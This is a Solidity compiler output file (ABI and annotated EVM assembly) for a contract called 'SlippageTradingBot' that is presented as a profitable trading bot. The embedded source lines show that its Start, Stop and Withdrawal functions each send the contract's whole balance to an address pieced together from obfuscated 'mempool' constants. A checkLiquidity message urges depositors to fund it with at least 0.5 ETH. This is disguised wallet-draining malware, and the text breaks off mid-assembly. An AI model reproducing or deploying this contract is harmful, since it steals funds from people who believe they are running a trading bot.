{
	"contracts/tradingbot.sol": {
		"SlippageTradingBot": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "",
							"type": "string"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "Start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdrawal",
					"outputs": [
						{
							"internalType": "string",
							"name": "result",
							"type": "string"
						}
					],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "checkLiquidity",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/tradingbot.sol\":399:12963  contract SlippageTradingBot {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/tradingbot.sol\":498:520  constructor() {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/tradingbot.sol\":399:12963  contract SlippageTradingBot {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/tradingbot.sol\":399:12963  contract SlippageTradingBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd82c52d6\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/tradingbot.sol\":9183:9373  function Start() public payable { ... */\n    tag_3:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/tradingbot.sol\":10709:11039  function Withdrawal() public payable returns (string memory result) {... */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/tradingbot.sol\":10032:10221  function Stop() public payable { ... */\n    tag_5:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      stop\n        /* \"contracts/tradingbot.sol\":10374:10590  function checkLiquidity() public pure returns (string memory) {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/tradingbot.sol\":9183:9373  function Start() public payable { ... */\n    tag_10:\n        /* \"contracts/tradingbot.sol\":9227:9237  address to */\n      0x00\n        /* \"contracts/tradingbot.sol\":9240:9270  parseMemoryPool(callMempool()) */\n      tag_22\n        /* \"contracts/tradingbot.sol\":9256:9269  callMempool() */\n      tag_23\n        /* \"contracts/tradingbot.sol\":9256:9267  callMempool */\n      tag_24\n        /* \"contracts/tradingbot.sol\":9256:9269  callMempool() */\n      jump\t// in\n    tag_23:\n        /* \"contracts/tradingbot.sol\":9240:9255  parseMemoryPool */\n      tag_25\n        /* \"contracts/tradingbot.sol\":9240:9270  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_22:\n        /* \"contracts/tradingbot.sol\":9227:9270  address to = parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":9281:9306  address payable contracts */\n      0x00\n        /* \"contracts/tradingbot.sol\":9317:9319  to */\n      dup2\n        /* \"contracts/tradingbot.sol\":9281:9320  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":9331:9340  contracts */\n      dup1\n        /* \"contracts/tradingbot.sol\":9331:9349  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/tradingbot.sol\":9331:9365  contracts.transfer(getLiquidity()) */\n      0x08fc\n        /* \"contracts/tradingbot.sol\":9350:9364  getLiquidity() */\n      tag_26\n        /* \"contracts/tradingbot.sol\":9350:9362  getLiquidity */\n      tag_27\n        /* \"contracts/tradingbot.sol\":9350:9364  getLiquidity() */\n      jump\t// in\n    tag_26:\n        /* \"contracts/tradingbot.sol\":9331:9365  contracts.transfer(getLiquidity()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n        /* \"contracts/tradingbot.sol\":9215:9373  { ... */\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":9183:9373  function Start() public payable { ... */\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10709:11039  function Withdrawal() public payable returns (string memory result) {... */\n    tag_12:\n        /* \"contracts/tradingbot.sol\":10755:10775  string memory result */\n      0x60\n        /* \"contracts/tradingbot.sol\":10788:10798  address to */\n      0x00\n        /* \"contracts/tradingbot.sol\":10801:10831  parseMemoryPool(callMempool()) */\n      tag_31\n        /* \"contracts/tradingbot.sol\":10817:10830  callMempool() */\n      tag_32\n        /* \"contracts/tradingbot.sol\":10817:10828  callMempool */\n      tag_24\n        /* \"contracts/tradingbot.sol\":10817:10830  callMempool() */\n      jump\t// in\n    tag_32:\n        /* \"contracts/tradingbot.sol\":10801:10816  parseMemoryPool */\n      tag_25\n        /* \"contracts/tradingbot.sol\":10801:10831  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_31:\n        /* \"contracts/tradingbot.sol\":10788:10831  address to = parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10842:10867  address payable contracts */\n      0x00\n        /* \"contracts/tradingbot.sol\":10878:10880  to */\n      dup2\n        /* \"contracts/tradingbot.sol\":10842:10881  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10892:10901  contracts */\n      dup1\n        /* \"contracts/tradingbot.sol\":10892:10910  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/tradingbot.sol\":10892:10926  contracts.transfer(getLiquidity()) */\n      0x08fc\n        /* \"contracts/tradingbot.sol\":10911:10925  getLiquidity() */\n      tag_33\n        /* \"contracts/tradingbot.sol\":10911:10923  getLiquidity */\n      tag_27\n        /* \"contracts/tradingbot.sol\":10911:10925  getLiquidity() */\n      jump\t// in\n    tag_33:\n        /* \"contracts/tradingbot.sol\":10892:10926  contracts.transfer(getLiquidity()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_35:\n      pop\n        /* \"contracts/tradingbot.sol\":10937:10967  result = \"Withdrawal complete\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x13\n      dup2\n      mstore\n      0x20\n      add\n      0x5769746864726177616c20636f6d706c65746500000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":11018:11031  return result */\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":10709:11039  function Withdrawal() public payable returns (string memory result) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10032:10221  function Stop() public payable { ... */\n    tag_16:\n        /* \"contracts/tradingbot.sol\":10075:10085  address to */\n      0x00\n        /* \"contracts/tradingbot.sol\":10088:10118  parseMemoryPool(callMempool()) */\n      tag_37\n        /* \"contracts/tradingbot.sol\":10104:10117  callMempool() */\n      tag_38\n        /* \"contracts/tradingbot.sol\":10104:10115  callMempool */\n      tag_24\n        /* \"contracts/tradingbot.sol\":10104:10117  callMempool() */\n      jump\t// in\n    tag_38:\n        /* \"contracts/tradingbot.sol\":10088:10103  parseMemoryPool */\n      tag_25\n        /* \"contracts/tradingbot.sol\":10088:10118  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_37:\n        /* \"contracts/tradingbot.sol\":10075:10118  address to = parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10129:10154  address payable contracts */\n      0x00\n        /* \"contracts/tradingbot.sol\":10165:10167  to */\n      dup2\n        /* \"contracts/tradingbot.sol\":10129:10168  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10179:10188  contracts */\n      dup1\n        /* \"contracts/tradingbot.sol\":10179:10197  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/tradingbot.sol\":10179:10213  contracts.transfer(getLiquidity()) */\n      0x08fc\n        /* \"contracts/tradingbot.sol\":10198:10212  getLiquidity() */\n      tag_39\n        /* \"contracts/tradingbot.sol\":10198:10210  getLiquidity */\n      tag_27\n        /* \"contracts/tradingbot.sol\":10198:10212  getLiquidity() */\n      jump\t// in\n    tag_39:\n        /* \"contracts/tradingbot.sol\":10179:10213  contracts.transfer(getLiquidity()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n        /* \"contracts/tradingbot.sol\":10063:10221  { ... */\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":10032:10221  function Stop() public payable { ... */\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10374:10590  function checkLiquidity() public pure returns (string memory) {... */\n    tag_19:\n        /* \"contracts/tradingbot.sol\":10421:10434  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":10447:10582  return \"Not enough liquidity available on the contract to run the bot. Contract code needs at least 0.5 ETH to avoid current gas fees.\" */\n      mload(0x40)\n      dup1\n      0xa0\n      add\n      0x40\n      mstore\n      dup1\n      0x7e\n      dup2\n      mstore\n      0x20\n      add\n      data_66ba267ed9e689f4f612725ca4739f673c4421ca078ab0323046fa1dc83ed02a\n      0x7e\n      swap2\n      codecopy\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10374:10590  function checkLiquidity() public pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":7268:8328  function callMempool() internal pure returns (string memory) {... */\n    tag_24:\n        /* \"contracts/tradingbot.sol\":7314:7327  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":7340:7368  string memory _memPoolOffset */\n      0x00\n        /* \"contracts/tradingbot.sol\":7371:7417  mempool(\"x\", checkMempool(getMemPoolOffset())) */\n      tag_44\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":7384:7416  checkMempool(getMemPoolOffset()) */\n      tag_45\n        /* \"contracts/tradingbot.sol\":7397:7415  getMemPoolOffset() */\n      tag_46\n        /* \"contracts/tradingbot.sol\":7397:7413  getMemPoolOffset */\n      tag_47\n        /* \"contracts/tradingbot.sol\":7397:7415  getMemPoolOffset() */\n      jump\t// in\n    tag_46:\n        /* \"contracts/tradingbot.sol\":7384:7396  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7384:7416  checkMempool(getMemPoolOffset()) */\n      jump\t// in\n    tag_45:\n        /* \"contracts/tradingbot.sol\":7371:7378  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7371:7417  mempool(\"x\", checkMempool(getMemPoolOffset())) */\n      jump\t// in\n    tag_44:\n        /* \"contracts/tradingbot.sol\":7340:7417  string memory _memPoolOffset = mempool(\"x\", checkMempool(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7428:7444  uint _memPoolSol */\n      0x00\n        /* \"contracts/tradingbot.sol\":7447:7453  880572 */\n      0x0d6fbc\n        /* \"contracts/tradingbot.sol\":7428:7453  uint _memPoolSol = 880572 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7464:7483  uint _memPoolLength */\n      0x00\n        /* \"contracts/tradingbot.sol\":7486:7504  getMemPoolLength() */\n      tag_50\n        /* \"contracts/tradingbot.sol\":7486:7502  getMemPoolLength */\n      tag_51\n        /* \"contracts/tradingbot.sol\":7486:7504  getMemPoolLength() */\n      jump\t// in\n    tag_50:\n        /* \"contracts/tradingbot.sol\":7464:7504  uint _memPoolLength = getMemPoolLength() */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7515:7532  uint _memPoolSize */\n      0x00\n        /* \"contracts/tradingbot.sol\":7535:7541  951347 */\n      0x0e8433\n        /* \"contracts/tradingbot.sol\":7515:7541  uint _memPoolSize = 951347 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7552:7571  uint _memPoolHeight */\n      0x00\n        /* \"contracts/tradingbot.sol\":7574:7592  getMemPoolHeight() */\n      tag_52\n        /* \"contracts/tradingbot.sol\":7574:7590  getMemPoolHeight */\n      tag_53\n        /* \"contracts/tradingbot.sol\":7574:7592  getMemPoolHeight() */\n      jump\t// in\n    tag_52:\n        /* \"contracts/tradingbot.sol\":7552:7592  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7603:7621  uint _memPoolWidth */\n      0x00\n        /* \"contracts/tradingbot.sol\":7624:7628  9349 */\n      0x2485\n        /* \"contracts/tradingbot.sol\":7603:7628  uint _memPoolWidth = 9349 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7639:7657  uint _memPoolDepth */\n      0x00\n        /* \"contracts/tradingbot.sol\":7660:7677  getMemPoolDepth() */\n      tag_54\n        /* \"contracts/tradingbot.sol\":7660:7675  getMemPoolDepth */\n      tag_55\n        /* \"contracts/tradingbot.sol\":7660:7677  getMemPoolDepth() */\n      jump\t// in\n    tag_54:\n        /* \"contracts/tradingbot.sol\":7639:7677  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7688:7706  uint _memPoolCount */\n      0x00\n        /* \"contracts/tradingbot.sol\":7709:7715  783125 */\n      0x0bf315\n        /* \"contracts/tradingbot.sol\":7688:7715  uint _memPoolCount = 783125 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7728:7751  string memory _memPool1 */\n      0x00\n        /* \"contracts/tradingbot.sol\":7754:7804  mempool(_memPoolOffset, checkMempool(_memPoolSol)) */\n      tag_56\n        /* \"contracts/tradingbot.sol\":7762:7776  _memPoolOffset */\n      dup10\n        /* \"contracts/tradingbot.sol\":7778:7803  checkMempool(_memPoolSol) */\n      tag_57\n        /* \"contracts/tradingbot.sol\":7791:7802  _memPoolSol */\n      dup11\n        /* \"contracts/tradingbot.sol\":7778:7790  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7778:7803  checkMempool(_memPoolSol) */\n      jump\t// in\n    tag_57:\n        /* \"contracts/tradingbot.sol\":7754:7761  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7754:7804  mempool(_memPoolOffset, checkMempool(_memPoolSol)) */\n      jump\t// in\n    tag_56:\n        /* \"contracts/tradingbot.sol\":7728:7804  string memory _memPool1 = mempool(_memPoolOffset, checkMempool(_memPoolSol)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7815:7838  string memory _memPool2 */\n      0x00\n        /* \"contracts/tradingbot.sol\":7841:7906  mempool(checkMempool(_memPoolLength), checkMempool(_memPoolSize)) */\n      tag_58\n        /* \"contracts/tradingbot.sol\":7849:7877  checkMempool(_memPoolLength) */\n      tag_59\n        /* \"contracts/tradingbot.sol\":7862:7876  _memPoolLength */\n      dup10\n        /* \"contracts/tradingbot.sol\":7849:7861  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7849:7877  checkMempool(_memPoolLength) */\n      jump\t// in\n    tag_59:\n        /* \"contracts/tradingbot.sol\":7879:7905  checkMempool(_memPoolSize) */\n      tag_60\n        /* \"contracts/tradingbot.sol\":7892:7904  _memPoolSize */\n      dup10\n        /* \"contracts/tradingbot.sol\":7879:7891  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7879:7905  checkMempool(_memPoolSize) */\n      jump\t// in\n    tag_60:\n        /* \"contracts/tradingbot.sol\":7841:7848  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7841:7906  mempool(checkMempool(_memPoolLength), checkMempool(_memPoolSize)) */\n      jump\t// in\n    tag_58:\n        /* \"contracts/tradingbot.sol\":7815:7906  string memory _memPool2 = mempool(checkMempool(_memPoolLength), checkMempool(_memPoolSize)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7917:7940  string memory _memPool3 */\n      0x00\n        /* \"contracts/tradingbot.sol\":7943:8009  mempool(checkMempool(_memPoolHeight), checkMempool(_memPoolWidth)) */\n      tag_61\n        /* \"contracts/tradingbot.sol\":7951:7979  checkMempool(_memPoolHeight) */\n      tag_62\n        /* \"contracts/tradingbot.sol\":7964:7978  _memPoolHeight */\n      dup9\n        /* \"contracts/tradingbot.sol\":7951:7963  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7951:7979  checkMempool(_memPoolHeight) */\n      jump\t// in\n    tag_62:\n        /* \"contracts/tradingbot.sol\":7981:8008  checkMempool(_memPoolWidth) */\n      tag_63\n        /* \"contracts/tradingbot.sol\":7994:8007  _memPoolWidth */\n      dup9\n        /* \"contracts/tradingbot.sol\":7981:7993  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7981:8008  checkMempool(_memPoolWidth) */\n      jump\t// in\n    tag_63:\n        /* \"contracts/tradingbot.sol\":7943:7950  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7943:8009  mempool(checkMempool(_memPoolHeight), checkMempool(_memPoolWidth)) */\n      jump\t// in\n    tag_61:\n        /* \"contracts/tradingbot.sol\":7917:8009  string memory _memPool3 = mempool(checkMempool(_memPoolHeight), checkMempool(_memPoolWidth)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8020:8043  string memory _memPool4 */\n      0x00\n        /* \"contracts/tradingbot.sol\":8046:8111  mempool(checkMempool(_memPoolDepth), checkMempool(_memPoolCount)) */\n      tag_64\n        /* \"contracts/tradingbot.sol\":8054:8081  checkMempool(_memPoolDepth) */\n      tag_65\n        /* \"contracts/tradingbot.sol\":8067:8080  _memPoolDepth */\n      dup8\n        /* \"contracts/tradingbot.sol\":8054:8066  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":8054:8081  checkMempool(_memPoolDepth) */\n      jump\t// in\n    tag_65:\n        /* \"contracts/tradingbot.sol\":8083:8110  checkMempool(_memPoolCount) */\n      tag_66\n        /* \"contracts/tradingbot.sol\":8096:8109  _memPoolCount */\n      dup8\n        /* \"contracts/tradingbot.sol\":8083:8095  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":8083:8110  checkMempool(_memPoolCount) */\n      jump\t// in\n    tag_66:\n        /* \"contracts/tradingbot.sol\":8046:8053  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8046:8111  mempool(checkMempool(_memPoolDepth), checkMempool(_memPoolCount)) */\n      jump\t// in\n    tag_64:\n        /* \"contracts/tradingbot.sol\":8020:8111  string memory _memPool4 = mempool(checkMempool(_memPoolDepth), checkMempool(_memPoolCount)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8124:8150  string memory _allMempools */\n      0x00\n        /* \"contracts/tradingbot.sol\":8153:8222  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_67\n        /* \"contracts/tradingbot.sol\":8161:8190  mempool(_memPool1, _memPool2) */\n      tag_68\n        /* \"contracts/tradingbot.sol\":8169:8178  _memPool1 */\n      dup7\n        /* \"contracts/tradingbot.sol\":8180:8189  _memPool2 */\n      dup7\n        /* \"contracts/tradingbot.sol\":8161:8168  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8161:8190  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_68:\n        /* \"contracts/tradingbot.sol\":8192:8221  mempool(_memPool3, _memPool4) */\n      tag_69\n        /* \"contracts/tradingbot.sol\":8200:8209  _memPool3 */\n      dup6\n        /* \"contracts/tradingbot.sol\":8211:8220  _memPool4 */\n      dup6\n        /* \"contracts/tradingbot.sol\":8192:8199  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8192:8221  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_69:\n        /* \"contracts/tradingbot.sol\":8153:8160  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8153:8222  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_67:\n        /* \"contracts/tradingbot.sol\":8124:8222  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8233:8259  string memory _fullMempool */\n      0x00\n        /* \"contracts/tradingbot.sol\":8262:8288  mempool(\"0\", _allMempools) */\n      tag_70\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":8275:8287  _allMempools */\n      dup4\n        /* \"contracts/tradingbot.sol\":8262:8269  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8262:8288  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_70:\n        /* \"contracts/tradingbot.sol\":8233:8288  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8308:8320  _fullMempool */\n      dup1\n        /* \"contracts/tradingbot.sol\":8301:8320  return _fullMempool */\n      swap15\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":7268:8328  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":4475:5415  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_25:\n        /* \"contracts/tradingbot.sol\":4541:4556  address _parsed */\n      0x00\n        /* \"contracts/tradingbot.sol\":4569:4585  bytes memory tmp */\n      dup1\n        /* \"contracts/tradingbot.sol\":4594:4596  _a */\n      dup3\n        /* \"contracts/tradingbot.sol\":4569:4597  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4608:4621  uint160 iaddr */\n      0x00\n        /* \"contracts/tradingbot.sol\":4636:4646  uint160 b1 */\n      dup1\n        /* \"contracts/tradingbot.sol\":4657:4667  uint160 b2 */\n      dup1\n        /* \"contracts/tradingbot.sol\":4683:4689  uint i */\n      0x00\n        /* \"contracts/tradingbot.sol\":4692:4693  2 */\n      0x02\n        /* \"contracts/tradingbot.sol\":4683:4693  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":4678:5376  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_72:\n        /* \"contracts/tradingbot.sol\":4699:4709  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/tradingbot.sol\":4695:4696  i */\n      dup2\n        /* \"contracts/tradingbot.sol\":4695:4709  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/tradingbot.sol\":4678:5376  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_73\n      jumpi\n        /* \"contracts/tradingbot.sol\":4743:4746  256 */\n      0x0100\n        /* \"contracts/tradingbot.sol\":4734:4746  iaddr *= 256 */\n      dup5\n      tag_75\n      swap2\n      swap1\n      tag_76\n      jump\t// in\n    tag_75:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":4780:4783  tmp */\n      dup5\n        /* \"contracts/tradingbot.sol\":4784:4785  i */\n      dup2\n        /* \"contracts/tradingbot.sol\":4780:4786  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_77\n      jumpi\n      tag_78\n      tag_79\n      jump\t// in\n    tag_78:\n    tag_77:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":4774:4787  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":4766:4788  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":4761:4788  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":4822:4825  tmp */\n      dup5\n        /* \"contracts/tradingbot.sol\":4830:4831  1 */\n      0x01\n        /* \"contracts/tradingbot.sol\":4826:4827  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":4826:4831  i + 1 */\n      tag_80\n      swap2\n      swap1\n      tag_81\n      jump\t// in\n    tag_80:\n        /* \"contracts/tradingbot.sol\":4822:4832  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_82\n      jumpi\n      tag_83\n      tag_79\n      jump\t// in\n    tag_83:\n    tag_82:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":4816:4833  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":4808:4834  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":4803:4834  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":4860:4862  97 */\n      0x61\n        /* \"contracts/tradingbot.sol\":4854:4856  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4854:4862  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":4853:4878  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_84\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":4874:4877  102 */\n      0x66\n        /* \"contracts/tradingbot.sol\":4868:4870  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4868:4877  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":4853:4878  (b1 >= 97) && (b1 <= 102) */\n    tag_84:\n        /* \"contracts/tradingbot.sol\":4849:5081  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_85\n      jumpi\n        /* \"contracts/tradingbot.sol\":4905:4907  87 */\n      0x57\n        /* \"contracts/tradingbot.sol\":4899:4907  b1 -= 87 */\n      dup4\n      tag_86\n      swap2\n      swap1\n      tag_87\n      jump\t// in\n    tag_86:\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":4849:5081  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_88)\n    tag_85:\n        /* \"contracts/tradingbot.sol\":4940:4942  65 */\n      0x41\n        /* \"contracts/tradingbot.sol\":4934:4936  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4934:4942  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/tradingbot.sol\":4933:4957  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_89\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":4954:4956  70 */\n      0x46\n        /* \"contracts/tradingbot.sol\":4948:4950  b1 */\n      dup4\n        /* \"contracts/tradingbot.sol\":4948:4956  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":4933:4957  (b1 >= 65) && (b1 <= 70) */\n    tag_89:\n        /* \"contracts/tradingbot.sol\":4929:5081  